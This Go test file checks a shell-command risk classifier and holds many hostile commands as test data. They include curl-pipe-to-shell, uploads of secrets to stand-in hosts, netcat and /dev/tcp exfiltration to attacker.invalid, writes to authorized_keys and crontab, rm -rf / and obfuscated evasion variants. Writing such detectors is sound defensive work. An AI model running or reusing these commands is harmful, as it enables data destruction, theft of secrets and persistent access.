package cmdclass

import (
	"testing"

	"github.com/JiangHe12/opskit-core/v2/safety"
)

func TestScanPreservesQuotedExpansionMetadata(t *testing.T) {
	t.Parallel()

	items, ok := scan(`echo '*' * \* ""`)
	if !ok {
		t.Fatal("scan returned false")
	}
	if len(items) != 5 {
		t.Fatalf("len(items) = %d, want 5: %#v", len(items), items)
	}
	tests := []struct {
		index             int
		text              string
		quoted            bool
		unquotedExpansion bool
	}{
		{index: 0, text: "echo"},
		{index: 1, text: "*", quoted: true},
		{index: 2, text: "*", unquotedExpansion: true},
		{index: 3, text: "*", quoted: true},
		{index: 4, text: "", quoted: true},
	}
	for _, tt := range tests {
		got := items[tt.index]
		if got.text != tt.text || got.quoted != tt.quoted || got.unquotedExpansion != tt.unquotedExpansion {
			t.Fatalf("items[%d] = %#v, want text=%q quoted=%t unquotedExpansion=%t",
				tt.index, got, tt.text, tt.quoted, tt.unquotedExpansion)
		}
	}
}

func TestClassify(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		cmd  string
		want safety.Risk
	}{
		{name: "empty", cmd: "", want: safety.R3},
		{name: "whitespace", cmd: " \t\r\n", want: safety.R3},
		{name: "read only pwd", cmd: "pwd", want: safety.R0},
		{name: "read only ls", cmd: "ls -la /var/log", want: safety.R0},
		{name: "read only cat", cmd: "cat /var/log/syslog", want: safety.R0},
		{name: "read only grep", cmd: `grep -n "failed login" /var/log/auth.log`, want: safety.R0},
		{name: "read only systemctl status", cmd: "systemctl status sshd", want: safety.R0},
		{name: "read only systemctl show options after subcommand", cmd: "systemctl show nginx --property=ActiveState", want: safety.R0},
		{name: "read only file head", cmd: "head -c 1025 -- '/tmp/app file'", want: safety.R0},
		{name: "read only file stat", cmd: "stat -c '%F\t%s\t%a\t%U\t%G\t%Y' -- '/tmp/app file'", want: safety.R0},
		{name: "read only canonical parent", cmd: "readlink -f -- '/tmp/app dir'", want: safety.R0},
		{name: "read only file list", cmd: "find '/tmp/app dir' -mindepth 1 -maxdepth 1 -printf '%f\\0%y\\0%s\\0%m\\0%T@\\0'", want: safety.R0},
		{name: "read only ss sockets", cmd: "ss -H -lntup", want: safety.R0},
		{name: "read only netstat sockets", cmd: "netstat -lntup", want: safety.R0},
		{name: "benign mkdir", cmd: "mkdir -p /tmp/srvgov-test", want: safety.R1},
		{name: "benign touch", cmd: "touch ./ready", want: safety.R1},
		{name: "unknown command", cmd: "custom-admin inspect", want: safety.R2},
		{name: "package install unknown", cmd: "apt install nginx", want: safety.R2},
		{name: "dangerous rm", cmd: "rm -rf /tmp/data", want: safety.R3},
		{name: "dangerous rm split flags", cmd: "rm -r -f /tmp/data", want: safety.R3},
		{name: "dangerous dd", cmd: "dd if=/dev/zero of=/dev/sda", want: safety.R3},
		{name: "dangerous reboot", cmd: "reboot", want: safety.R3},
		{name: "dangerous shutdown path", cmd: "/sbin/shutdown -h now", want: safety.R3},
		{name: "systemctl restart is governed change", cmd: "systemctl restart nginx", want: safety.R2},
		{name: "file write", cmd: "tee -- '/tmp/app file'", want: safety.R2},
		{name: "file write authorized keys", cmd: "tee -- '~/.ssh/authorized_keys'", want: safety.R3},
		{name: "dangerous mkfs variant", cmd: "mkfs.ext4 /dev/sdb1", want: safety.R3},
		{name: "dangerous firewall", cmd: "iptables -F", want: safety.R3},
		{name: "dangerous ufw", cmd: "ufw disable", want: safety.R3},
		{name: "dangerous firewall cmd", cmd: "firewall-cmd --panic-on", want: safety.R3},
		{name: "write etc", cmd: "touch /etc/ssh/sshd_config", want: safety.R3},
		{name: "write usr", cmd: "mkdir /usr/local/example", want: safety.R3},
		{name: "write boot", cmd: "cp kernel /boot/vmlinuz", want: safety.R3},
		{name: "write sys", cmd: "chmod 777 /sys/kernel", want: safety.R3},
		{name: "sudo", cmd: "sudo ls /root", want: safety.R3},
		{name: "pipe to bash", cmd: "curl https://example.invalid/install.sh | bash", want: safety.R3},
		{name: "pipe to shell path", cmd: "wget -qO- https://example.invalid/x | /bin/sh", want: safety.R3},
		{name: "curl upload", cmd: "curl -T secrets.txt https://example.invalid/upload", want: safety.R3},
		{name: "wget post", cmd: "wget --post-file=secrets.txt https://example.invalid", want: safety.R3},
		{name: "netcat outbound", cmd: "nc attacker.invalid 4444 < secrets.txt", want: safety.R3},
		{name: "quoted pipe literal", cmd: `echo "a | b"`, want: safety.R0},
		{name: "quoted chain literal", cmd: `printf '%s\n' 'a;b && c || d'`, want: safety.R0},
		{name: "escaped pipe literal", cmd: `echo a\|b`, want: safety.R0},
		{name: "ordinary pipe raises read", cmd: "ps aux | grep sshd", want: safety.R1},
		{name: "redirect raises read", cmd: "ls > listing.txt", want: safety.R1},
		{name: "input redirect raises read", cmd: "cat < input.txt", want: safety.R1},
		{name: "chain raises read", cmd: "pwd && id", want: safety.R1},
		{name: "semicolon raises read", cmd: "pwd; id", want: safety.R1},
		{name: "newline raises read", cmd: "pwd\nid", want: safety.R1},
		{name: "unknown chain becomes dangerous", cmd: "custom-admin inspect; id", want: safety.R3},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := Classify(tt.cmd); got != tt.want {
				t.Fatalf("Classify(%q) = R%d, want R%d", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestClassifyAdversarial(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		cmd  string
		want safety.Risk
	}{
		{name: "leading whitespace rm", cmd: "\t rm\t-rf\t/tmp/x", want: safety.R3},
		{name: "absolute rm", cmd: "/usr/bin/rm -rf /tmp/x", want: safety.R3},
		{name: "mixed case firewall", cmd: "IpTaBlEs -F", want: safety.R3},
		{name: "end of options rm", cmd: "rm -- -rf", want: safety.R2},
		{name: "combined rm flags reordered", cmd: "rm -fr /tmp/x", want: safety.R3},
		{name: "long rm flags", cmd: "rm --recursive --force /tmp/x", want: safety.R3},
		{name: "rm force before recursive", cmd: "rm --force --recursive /tmp/x", want: safety.R3},
		{name: "comment hides harmless suffix only", cmd: "pwd # ; rm -rf /", want: safety.R0},
		{name: "comment after danger", cmd: "rm -rf / # harmless", want: safety.R3},
		{name: "comment newline cannot hide danger", cmd: "pwd # harmless\nrm -rf /", want: safety.R3},
		{name: "hash inside word not comment", cmd: "custom#command inspect", want: safety.R2},
		{name: "single quote nesting literal", cmd: `echo '$(rm -rf /) | bash'`, want: safety.R0},
		{name: "double quote command substitution", cmd: `echo "$(rm -rf /)"`, want: safety.R3},
		{name: "backtick substitution", cmd: "echo `rm -rf /`", want: safety.R3},
		{name: "substitution split dangerous word", cmd: `r$(printf m) -rf /tmp/x`, want: safety.R3},
		{name: "parameter expansion in command", cmd: `r${x}m -rf /tmp/x`, want: safety.R3},
		{name: "parameter expansion in flags", cmd: `rm -r${x}f /tmp/x`, want: safety.R3},
		{name: "ifs command split", cmd: `rm${IFS}-rf${IFS}/tmp/x`, want: safety.R3},
		{name: "ansi c encoded command", cmd: `$'\x72\x6d' -rf /tmp/x`, want: safety.R3},
		{name: "eval encoded payload", cmd: `eval "$(printf '\162\155\40\55\162\146\40\57')"`, want: safety.R3},
		{name: "base64 decode pipe shell", cmd: "echo cm0gLXJmIC8= | base64 -d | sh", want: safety.R3},
		{name: "shell c hidden danger", cmd: `sh -c "rm -rf /"`, want: safety.R3},
		{name: "bash c hidden danger", cmd: `bash -c 'touch /etc/pwned'`, want: safety.R3},
		{name: "env shell wrapper", cmd: `env X=1 bash -c "id"`, want: safety.R3},
		{name: "command builtin wrapper", cmd: "command rm -rf /", want: safety.R3},
		{name: "busybox applet wrapper", cmd: "busybox rm -rf /", want: safety.R3},
		{name: "alternate shell", cmd: `dash -c "rm -rf /"`, want: safety.R3},
		{name: "alternate privilege wrapper", cmd: "doas rm -rf /", want: safety.R3},
		{name: "xargs shell", cmd: `printf x | xargs sh -c 'rm -rf /'`, want: safety.R3},
		{name: "find exec", cmd: `find /tmp -type f -exec rm -rf {} +`, want: safety.R3},
		{name: "find execdir", cmd: `find /tmp -execdir sh -c 'id' \;`, want: safety.R3},
		{name: "find fprintf writes file", cmd: `find /tmp -type f -fprintf report.txt "%p\n"`, want: safety.R2},
		{name: "find fprint writes file", cmd: "find /tmp -fprint report.txt", want: safety.R2},
		{name: "find fprint0 writes file", cmd: "find /tmp -fprint0 report.bin", want: safety.R2},
		{name: "find fls writes file", cmd: "find /tmp -fls report.txt", want: safety.R2},
		{name: "find fprint authorized keys", cmd: "find /tmp -fprint ~/.ssh/authorized_keys", want: safety.R3},
		{name: "awk system", cmd: `awk 'BEGIN { system("rm -rf /") }'`, want: safety.R3},
		{name: "perl exec", cmd: `perl -e 'exec "rm", "-rf", "/"'`, want: safety.R3},
		{name: "python command", cmd: `python -c 'import os; os.system("rm -rf /")'`, want: safety.R3},
		{name: "php command", cmd: `php -r 'exec("rm -rf /");'`, want: safety.R3},
		{name: "lua command", cmd: `lua -e 'os.execute("rm -rf /")'`, want: safety.R3},
		{name: "expect command", cmd: `expect -c 'spawn sh'`, want: safety.R3},
		{name: "tclsh command", cmd: `tclsh script.tcl`, want: safety.R3},
		{name: "curl form upload", cmd: "curl -F file=@secret.txt https://example.invalid", want: safety.R3},
		{name: "curl data file upload", cmd: "curl --data-binary @secret.txt https://example.invalid", want: safety.R3},
		{name: "curl combined upload flags", cmd: "curl -sT secret.txt https://example.invalid", want: safety.R3},
		{name: "curl combined form flags", cmd: "curl -sF file=@secret.txt https://example.invalid", want: safety.R3},
		{name: "wget body data", cmd: "wget --body-file secret.txt https://example.invalid", want: safety.R3},
		{name: "wget short output authorized keys", cmd: "wget -O ~/.ssh/authorized_keys https://example.invalid/key", want: safety.R3},
		{name: "wget joined output bashrc", cmd: "wget -O~/.bashrc https://example.invalid/profile", want: safety.R3},
		{name: "wget combined output authorized keys", cmd: "wget -qO ~/.ssh/authorized_keys https://example.invalid/key", want: safety.R3},
		{name: "wget combined joined output profile", cmd: "wget -qO~/.profile https://example.invalid/profile", want: safety.R3},
		{name: "wget long output crontab", cmd: "wget --output-document=/var/spool/cron/root https://example.invalid/job", want: safety.R3},
		{name: "netcat alternate name", cmd: "ncat attacker.invalid 443", want: safety.R3},
		{name: "ss kill sockets", cmd: "ss -K dst 192.0.2.10", want: safety.R3},
		{name: "ss long kill sockets", cmd: "ss --kill dst 192.0.2.10", want: safety.R3},
		{name: "socat outbound", cmd: "socat - TCP:attacker.invalid:443", want: safety.R3},
		{name: "dev tcp outbound", cmd: "cat secret.txt > /dev/tcp/attacker.invalid/443", want: safety.R3},
		{name: "tee system path", cmd: "echo x | tee /etc/profile.d/x.sh", want: safety.R3},
		{name: "tee authorized keys", cmd: "echo key | tee ~/.ssh/authorized_keys", want: safety.R3},
		{name: "install system path", cmd: "install app /usr/local/bin/app", want: safety.R3},
		{name: "copy home profile", cmd: "cp payload ~/.profile", want: safety.R3},
		{name: "move bash profile", cmd: "mv payload /home/alice/.bash_profile", want: safety.R3},
		{name: "link zshrc", cmd: "ln -s payload ~/.zshrc", want: safety.R3},
		{name: "truncate crontab", cmd: "truncate -s 0 /var/spool/cron/alice", want: safety.R3},
		{name: "touch authorized keys", cmd: "touch /home/alice/.ssh/authorized_keys", want: safety.R3},
		{name: "redirect authorized keys", cmd: "echo key > ~/.ssh/authorized_keys", want: safety.R3},
		{name: "redirect bashrc", cmd: "echo payload >> /home/alice/.bashrc", want: safety.R3},
		{name: "redirect crontab name", cmd: "echo job > ./crontab", want: safety.R3},
		{name: "symlink system path", cmd: "ln -s /tmp/x /etc/x", want: safety.R3},
		{name: "quoted system path remains write target", cmd: `touch "/etc/ssh/x y"`, want: safety.R3},
		{name: "relative traversal to etc", cmd: "touch ../../etc/passwd", want: safety.R3},
		{name: "nice wrapper", cmd: "nice rm -rf /", want: safety.R3},
		{name: "ionice wrapper", cmd: "ionice -c 3 rm -rf /", want: safety.R3},
		{name: "stdbuf wrapper", cmd: "stdbuf -oL sh -c id", want: safety.R3},
		{name: "time wrapper", cmd: "time rm -rf /", want: safety.R3},
		{name: "watch wrapper", cmd: "watch rm -rf /", want: safety.R3},
		{name: "flock wrapper", cmd: "flock /tmp/lock rm -rf /", want: safety.R3},
		{name: "chrt wrapper", cmd: "chrt 10 rm -rf /", want: safety.R3},
		{name: "taskset wrapper", cmd: "taskset -c 0 rm -rf /", want: safety.R3},
		{name: "null byte", cmd: "ls\x00-rf", want: safety.R3},
		{name: "unterminated single quote", cmd: "echo 'x", want: safety.R3},
		{name: "unterminated double quote", cmd: `echo "x`, want: safety.R3},
		{name: "trailing escape", cmd: `echo x\`, want: safety.R3},
		{name: "bare opening substitution", cmd: "echo $(", want: safety.R3},
		{name: "process substitution", cmd: "cat <(id)", want: safety.R3},
		{name: "background operator", cmd: "pwd & rm -rf /", want: safety.R3},
		{name: "unicode whitespace command", cmd: "rm\u00a0-rf\u00a0/", want: safety.R3},
		{name: "systemctl unit named reboot is not subcommand", cmd: "systemctl restart reboot.service", want: safety.R2},
		{name: "exec wrapper", cmd: "exec rm -rf /", want: safety.R3},
		{name: "builtin wrapper", cmd: "builtin rm -rf /", want: safety.R3},
		{name: "source wrapper", cmd: "source /tmp/maintenance.sh", want: safety.R3},
		{name: "dot source wrapper", cmd: ". /tmp/maintenance.sh", want: safety.R3},
		{name: "trap wrapper", cmd: "trap 'rm -rf /tmp/data' EXIT", want: safety.R3},
		{name: "environment assignment wrapper", cmd: "MODE=unsafe rm -rf /", want: safety.R3},
		{name: "environment append assignment wrapper", cmd: "PATH+=:/tmp rm -rf /", want: safety.R3},
		{name: "negation wrapper", cmd: "! rm -rf /", want: safety.R3},
		{name: "brace expansion in command", cmd: "r{m,echo} -rf /tmp/data", want: safety.R3},
		{name: "glob expansion in command", cmd: "r? -rf /tmp/data", want: safety.R3},
		{name: "quoted read glob literal", cmd: "echo '*'", want: safety.R0},
		{name: "escaped read glob literal", cmd: `echo \*`, want: safety.R0},
		{name: "unquoted read glob fails closed", cmd: "echo *", want: safety.R3},
		{name: "find brace expansion fails closed", cmd: "find /tmp -{print,delete}", want: safety.R3},
		{name: "ss brace expansion fails closed", cmd: "ss --{numeric,kill}", want: safety.R3},
		{name: "quoted find glob literal", cmd: "find /tmp -name '*.log'", want: safety.R0},
		{name: "escaped find glob literal", cmd: `find /tmp -name \*.log`, want: safety.R0},
		{name: "quoted ss brace literal", cmd: "ss '--{numeric,kill}'", want: safety.R0},
		{name: "brace expansion in write target", cmd: "touch /tmp/{ready,done}", want: safety.R3},
		{name: "bracket expansion in write target", cmd: "touch /tmp/ready[12]", want: safety.R3},
		{name: "quoted write glob literal", cmd: "touch '/tmp/ready*'", want: safety.R1},
		{name: "glob expansion in redirect target", cmd: "echo ready > /tmp/output*", want: safety.R3},
		{name: "tilde expansion in write target", cmd: "touch ~root/owned", want: safety.R3},
		{name: "tilde expansion in redirect target", cmd: "echo ready > ~root/owned", want: safety.R3},
		{name: "tilde expansion in command", cmd: "~/bin/custom inspect", want: safety.R3},
		{name: "quoted write tilde literal", cmd: "touch '~root/owned'", want: safety.R1},
		{name: "escaped write tilde literal", cmd: `touch \~root/owned`, want: safety.R1},
		{name: "quoted read tilde literal", cmd: "echo '~root/owned'", want: safety.R0},
		{name: "glob expansion in sensitive argument", cmd: "systemctl restart nginx*", want: safety.R3},
		{name: "glob expansion in remove argument", cmd: "rm /tmp/data*", want: safety.R3},
		{name: "quoted remove glob literal", cmd: "rm '/tmp/data*'", want: safety.R2},
		{name: "remove sensitive file without recursive force", cmd: "rm /etc/passwd", want: safety.R3},
		{name: "remove authorized keys without recursive force", cmd: "rm ~/.ssh/authorized_keys", want: safety.R3},
		{name: "remove recursively without force", cmd: "rm -r /tmp/data", want: safety.R3},
		{name: "remove recursively uppercase flag", cmd: "rm -R /tmp/data", want: safety.R3},
		{name: "remove recursively long option", cmd: "rm --recursive /tmp/data", want: safety.R3},
		{name: "remove abbreviated recursive option", cmd: "rm --rec /tmp/data", want: safety.R3},
		{name: "remove abbreviated force option", cmd: "rm --for /tmp/data", want: safety.R3},
		{name: "remove unknown long option", cmd: "rm --mystery /tmp/data", want: safety.R3},
		{name: "remove root without recursive flag", cmd: "rm /", want: safety.R3},
		{name: "remove root no preserve", cmd: "rm --no-preserve-root -r /", want: safety.R3},
		{name: "remove bin", cmd: "rm /bin/sh", want: safety.R3},
		{name: "remove lib64", cmd: "rm /lib64/libc.so", want: safety.R3},
		{name: "remove var", cmd: "rm /var/lib/app/state", want: safety.R3},
		{name: "remove run", cmd: "rm /run/app.pid", want: safety.R3},
		{name: "remove force non-sensitive target", cmd: "rm --force /tmp/data", want: safety.R2},
		{name: "date read current time", cmd: "date", want: safety.R0},
		{name: "date read parsed time", cmd: "date -d tomorrow +%F", want: safety.R0},
		{name: "date positional mutation", cmd: "date 072012002026", want: safety.R3},
		{name: "date unknown option", cmd: "date --mystery", want: safety.R3},
		{name: "date set long option", cmd: "date --set '2026-07-20 12:00:00'", want: safety.R3},
		{name: "date set short option", cmd: "date -s tomorrow", want: safety.R3},
		{name: "hostname read fqdn", cmd: "hostname -f", want: safety.R0},
		{name: "hostname mutation", cmd: "hostname changed-host", want: safety.R3},
		{name: "hostname file mutation", cmd: "hostname -F /tmp/hostname", want: safety.R3},
		{name: "journal read filters", cmd: "journalctl --unit nginx --lines 10", want: safety.R0},
		{name: "journal user cursor read", cmd: "journalctl --user --show-cursor -n 10", want: safety.R0},
		{name: "journal system read", cmd: "journalctl --system", want: safety.R0},
		{name: "journal combined short read", cmd: "journalctl -xeu nginx", want: safety.R0},
		{name: "journal attached short values", cmd: "journalctl -n100 -pwarning", want: safety.R0},
		{name: "journal previous boot read", cmd: "journalctl -b -1", want: safety.R0},
		{name: "journal attached boot read", cmd: "journalctl -b0", want: safety.R0},
		{name: "journal short option cannot hide rotate", cmd: "journalctl -n --rotate", want: safety.R3},
		{name: "journal long option cannot hide rotate", cmd: "journalctl --lines --rotate", want: safety.R3},
		{name: "journal unknown combined short", cmd: "journalctl -xz", want: safety.R3},
		{name: "journal rotate", cmd: "journalctl --rotate", want: safety.R3},
		{name: "journal vacuum", cmd: "journalctl --vacuum-time=1s", want: safety.R3},
		{name: "journal sync", cmd: "journalctl --sync", want: safety.R3},
		{name: "journal cursor file writes", cmd: "journalctl --cursor-file /tmp/cursor", want: safety.R3},
		{name: "journal attached sensitive cursor file writes", cmd: "journalctl --cursor-file=/etc/passwd", want: safety.R3},
		{name: "journal unknown option", cmd: "journalctl --mystery", want: safety.R3},
		{name: "ip link mutation", cmd: "ip link set eth0 down", want: safety.R3},
		{name: "ip address flush", cmd: "ip address flush dev eth0", want: safety.R3},
		{name: "ip route mutation", cmd: "ip route del default", want: safety.R3},
		{name: "ip rule mutation", cmd: "ip rule add from 192.0.2.0/24 table 100", want: safety.R3},
		{name: "ip namespace execution", cmd: "ip netns exec prod rm -rf /", want: safety.R3},
		{name: "ip namespace deletion", cmd: "ip netns delete prod", want: safety.R3},
		{name: "ip batch execution", cmd: "ip -batch changes.txt", want: safety.R3},
		{name: "ip unknown object", cmd: "ip mystery show", want: safety.R3},
		{name: "ip color link read", cmd: "ip -c link show dev eth0", want: safety.R0},
		{name: "ip abbreviated address read", cmd: "ip -br a", want: safety.R0},
		{name: "ip abbreviated route read", cmd: "ip r sh table main", want: safety.R0},
		{name: "ip abbreviated link read", cmd: "ip l sh dev eth0", want: safety.R0},
		{name: "ip ambiguous action", cmd: "ip link s dev eth0", want: safety.R3},
		{name: "ip link read", cmd: "ip link show dev eth0", want: safety.R0},
		{name: "ip address read", cmd: "ip -brief address show", want: safety.R0},
		{name: "ip route lookup", cmd: "ip route get 192.0.2.1", want: safety.R0},
		{name: "ip namespace list", cmd: "ip netns list", want: safety.R0},
		{name: "continued rm command", cmd: "r\\\nm -rf /tmp/data", want: safety.R3},
		{name: "continued sudo command", cmd: "su\\\ndo id", want: safety.R3},
		{name: "continued source command", cmd: "sou\\\nrce /tmp/maintenance.sh", want: safety.R3},
		{name: "double quoted continued rm command", cmd: "\"r\\\nm\" -rf /tmp/data", want: safety.R3},
		{name: "single quoted backslash newline command is literal", cmd: "'r\\\nm' -rf /tmp/data", want: safety.R2},
		{name: "double quoted backslash newline is continuation", cmd: "echo \"line\\\nbreak\"", want: safety.R0},
		{name: "single quoted backslash newline is literal", cmd: "echo 'line\\\nbreak'", want: safety.R0},
		{name: "continued empty comment remains empty", cmd: "\\\n# comment", want: safety.R3},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := Classify(tt.cmd); got != tt.want {
				t.Fatalf("Classify(%q) = R%d, want R%d", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestClassifySystemctlSubcommands(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		cmd  string
		want safety.Risk
	}{
		{name: "reboot", cmd: "systemctl reboot", want: safety.R3},
		{name: "poweroff", cmd: "systemctl poweroff", want: safety.R3},
		{name: "halt", cmd: "systemctl halt", want: safety.R3},
		{name: "kexec", cmd: "systemctl kexec", want: safety.R3},
		{name: "suspend", cmd: "systemctl suspend", want: safety.R3},
		{name: "hibernate", cmd: "systemctl hibernate", want: safety.R3},
		{name: "hybrid sleep", cmd: "systemctl hybrid-sleep", want: safety.R3},
		{name: "emergency", cmd: "systemctl emergency", want: safety.R3},
		{name: "rescue", cmd: "systemctl rescue", want: safety.R3},
		{name: "isolate", cmd: "systemctl isolate multi-user.target", want: safety.R3},
		{name: "switch root", cmd: "systemctl switch-root /sysroot", want: safety.R3},
		{name: "mask", cmd: "systemctl mask nginx", want: safety.R3},
		{name: "mixed case", cmd: "systemctl ReBoOt", want: safety.R3},
		{name: "dangerous option after subcommand", cmd: "systemctl reboot --force", want: safety.R3},
		{name: "front option fail closed", cmd: "systemctl --force reboot", want: safety.R3},
		{name: "combined front option fail closed", cmd: "systemctl -qf reboot", want: safety.R3},
		{name: "start", cmd: "systemctl start nginx", want: safety.R2},
		{name: "stop", cmd: "systemctl stop nginx", want: safety.R2},
		{name: "restart", cmd: "systemctl restart nginx", want: safety.R2},
		{name: "reload", cmd: "systemctl reload nginx", want: safety.R2},
		{name: "enable", cmd: "systemctl enable nginx", want: safety.R2},
		{name: "disable", cmd: "systemctl disable nginx", want: safety.R2},
		{name: "unit name is not inspected", cmd: "systemctl restart reboot.service", want: safety.R2},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := Classify(tt.cmd); got != tt.want {
				t.Fatalf("Classify(%q) = R%d, want R%d", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestClassifyDockerSubcommands(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		cmd  string
		want safety.Risk
	}{
		{name: "missing action", cmd: "docker", want: safety.R3},
		{name: "front global option", cmd: "docker --context prod run alpine", want: safety.R3},
		{name: "front short option", cmd: "docker -H tcp://host ps", want: safety.R3},
		{name: "ps", cmd: "docker ps --no-trunc", want: safety.R0},
		{name: "list alias", cmd: "docker ls", want: safety.R0},
		{name: "inspect", cmd: "docker inspect app", want: safety.R0},
		{name: "logs", cmd: "docker logs --tail 100 app", want: safety.R0},
		{name: "container ls", cmd: "docker container ls", want: safety.R0},
		{name: "image inspect", cmd: "docker image inspect alpine", want: safety.R0},
		{name: "volume inspect", cmd: "docker volume inspect data", want: safety.R0},
		{name: "network inspect", cmd: "docker network inspect bridge", want: safety.R0},
		{name: "start", cmd: "docker start app", want: safety.R2},
		{name: "stop", cmd: "docker stop app", want: safety.R2},
		{name: "restart", cmd: "docker restart app", want: safety.R2},
		{name: "remove", cmd: "docker rm app", want: safety.R3},
		{name: "grouped remove", cmd: "docker container rm app", want: safety.R3},
		{name: "image remove", cmd: "docker image rm app:old", want: safety.R3},
		{name: "volume remove", cmd: "docker volume rm data", want: safety.R3},
		{name: "container stop", cmd: "docker container stop app", want: safety.R2},
		{name: "container named run", cmd: "docker stop run", want: safety.R2},
		{name: "container named prune", cmd: "docker restart prune", want: safety.R2},
		{name: "run", cmd: "docker run alpine", want: safety.R3},
		{name: "create", cmd: "docker create alpine", want: safety.R3},
		{name: "exec", cmd: "docker exec app sh", want: safety.R3},
		{name: "build", cmd: "docker build .", want: safety.R3},
		{name: "commit", cmd: "docker commit app image", want: safety.R3},
		{name: "copy", cmd: "docker cp app:/etc/passwd .", want: safety.R3},
		{name: "import", cmd: "docker import rootfs.tar", want: safety.R3},
		{name: "save", cmd: "docker save image", want: safety.R3},
		{name: "load", cmd: "docker load", want: safety.R3},
		{name: "export", cmd: "docker export app", want: safety.R3},
		{name: "prune", cmd: "docker prune", want: safety.R3},
		{name: "system prune", cmd: "docker system prune", want: safety.R3},
		{name: "image prune", cmd: "docker image prune", want: safety.R3},
		{name: "builder prune", cmd: "docker builder prune", want: safety.R3},
		{name: "compose up", cmd: "docker compose up", want: safety.R3},
		{name: "compose run", cmd: "docker compose run web sh", want: safety.R3},
		{name: "compose exec", cmd: "docker compose exec web sh", want: safety.R3},
		{name: "compose detached", cmd: "docker compose up -d", want: safety.R3},
		{name: "standalone compose", cmd: "docker-compose up -d", want: safety.R3},
		{name: "stack deploy", cmd: "docker stack deploy -c x.yml s", want: safety.R3},
		{name: "mixed case dangerous", cmd: "DoCkEr SyStEm PrUnE", want: safety.R3},
		{name: "unknown direct action", cmd: "docker mystery app", want: safety.R3},
		{name: "unknown grouped action", cmd: "docker container mystery app", want: safety.R3},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := Classify(tt.cmd); got != tt.want {
				t.Fatalf("Classify(%q) = R%d, want R%d", tt.cmd, got, tt.want)
			}
		})
	}
}
